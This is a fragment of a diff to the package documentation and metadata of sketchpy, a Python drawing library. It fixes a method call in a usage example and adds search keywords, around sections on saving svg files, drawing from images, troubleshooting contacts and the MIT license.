         ```
             
         # `Saving` a loaded svg file
         
         Insted of waiting for the svg file to load, you can save as .npy file and use that for future use
             
@@ -121,15 +158,15 @@
             
         ## Drawing from `raw image`
             
         use the following code to draw any image, it need not to be an svg file
         ```
             from sketchpy import canvas
             obj = canvas.sketch_from_image('IMAGE PATH')
-            obj = draw(threshold = 127)
+            obj.draw(threshold = 127)
         ```
         #### NOTE: you can change the value of threshold to draw more detailed image, it's range is 0 - 255,use values between 90-190
         
         ### Troubleshooting
         
         - If you find any problem, you can pull request, or contact me on either [insta](https://www.instagram.com/mr.m_y_s_t_e_r_y/) or [discord](https://discord.gg/r2KFa73PM2)
         - You can also find video on my [youtube channel](https://www.youtube.com/playlist?list=PLb1Kbw_2jl_mr3A_cl6pXA1N5lwtHCx_7)
@@ -158,15 +195,15 @@
         
         
         ### License
         
         This project is licensed under the [MIT License](https://github.com/MRMYSTERY003/sketchpy/blob/main/LICENSE).
         
         
-Keywords: python,sketch,drawing,animation,code hub,pencil sketch,painting
+Keywords: python,sketch,drawing,animation,code hub,pencil sketch,painting,sketchpy,draw,sketching
 Platform: UNKNOWN
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
```

